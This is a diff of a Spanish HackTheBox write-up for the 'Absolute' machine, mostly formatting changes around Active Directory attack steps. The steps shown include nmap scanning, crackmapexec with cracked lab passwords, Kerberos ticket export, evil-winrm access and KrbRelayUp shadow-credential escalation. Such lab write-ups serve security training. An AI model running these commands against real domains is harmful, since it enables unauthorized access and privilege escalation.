@@ -17,17 +17,14 @@ En esta ocasión me he metido en un jaleo resolviendo la máquina Absolute de Ha
 
 
 ***
-
 **Un pequeño INDICE**
 
 1. [Reconocimiento](#reconocimiento).
     * [Reconocimiento de Puertos](#recon-nmap).
 2. [Explotación](#explotación).
 3. [Escalada de Privilegios](#privesc). 
-    
+
 ***
-
-
 # Reconocimiento [#](reconocimiento) {#reconocimiento}
 
 ## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}
@@ -36,7 +33,7 @@ Comenzamos lanzando nmap como de costumbre para escanear los 65535 puertos exist
 
 `nmap -p- -pn -n --min-rate 5000 10.10.11.181 -oG puertos_absolute`
 
-```bash
+```r
 ❯ nmap -p- -Pn -n --min-rate 5000 10.10.11.181 -oG puertos_absolute
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-03 12:35 CET
 Nmap scan report for 10.10.11.181
@@ -76,11 +73,11 @@ Nmap done: 1 IP address (1 host up) scanned in 60.55 seconds
 
 Encuentro varios puertos abiertos en la máquina pero no me arrojan mucha información, por lo que lanzo un comando un poco más avanzado que lanza una serie de scripts básicos de nmap y para obtener los servicios que corren en cada puerto y sus versiones.
 
-```bash
+```r
 nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49685,49691,49698,49702,62849 -sCV -n -Pn 10.10.11.181 -oN servicios_absolute
 ```
 
-```bash
+```r
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -159,7 +156,7 @@ Para comenzar lo primero que hago es recopilar algo de información con crackmap
 
 ```bash
 ❯ crackmapexec smb absolute.htb
-SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.181    445    DC    [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 ```
 
 Podemos ver que estamos ante una máquina *Windows 10*, podemos ver el dominio y que el *smb está firmado*, por lo que descarto el poder usar *responder* en algún momento.
@@ -214,7 +211,7 @@ Como se puede ver el usuario d.klay es vulnerable y obtengo el hash que voy a cr
 
 Al obtener las credenciales intento probarlas con crackmapexec para saber si podré enumerar los recursos comapartidos en la máquina.
 
-```bash
+```r
 ❯ crackmapexec smb absolute.htb -u 'd.klay' -p 'Darkmoonsky248girl'
 SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
@@ -250,12 +247,11 @@ Pero para poder continuar recordemos que el único método de autenticación que
 
 Una vez lo tenemos usaré crackmapexec para comprobar si de verdad tendré acceso a los recursos compartidos.
 
-```bash
+```r
 ❯ cme smb dc.absolute.htb -k --kdcHost dc.absolute.htb
 SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         dc.absolute.htb 445    DC               [+] absolute.htb\svc_smb 
 ```
-
 Y como se puede ver, tengo acceso asique empleo el mismo comando pero añadiendo --shares al final para listar todos los recursos.
 
 ![](/assets/images/HTB/Absolute-HackTheBox/13.webp)
@@ -345,11 +341,11 @@ Ejecuto el siguiente comando introduciendo todos los parámetros necesarios, tal
 
 Y ya tenemos el TGT del usuario winrm_user, por lo que lo exportamos a la variable KRB5CCNAME
 
-`❯ export KRB5CCNAME=/home/elc4br4/PKINITtools/winrmCcache`
+`export KRB5CCNAME=/home/elc4br4/PKINITtools/winrmCcache`
 
 Y ahora ya podemos conectarnos a la máquina a través de Winrm con este usuario.
 
-`❯ ruby evil-winrm.rb -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB`
+`ruby evil-winrm.rb -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB`
 
 ![](/assets/images/HTB/Absolute-HackTheBox/25.webp)
 
@@ -369,7 +365,9 @@ Tras descargarlas, compilarlas y subirlas a la máquina debemos ejecutar una ser
 
 * El primer paso es generar y agregar una credencial oculta mediante krbrelayup.
 
-`❯ ./RunasCs-cc.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 "/path/to/Krbrelayup.exe" -m shadowcred -cls {CLS}`
+```bash
+./RunasCs-cc.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 "/path/to/Krbrelayup.exe" -m shadowcred -cls {CLS}
+```
 
 ![](/assets/images/HTB/Absolute-HackTheBox/1.1.webp)
 
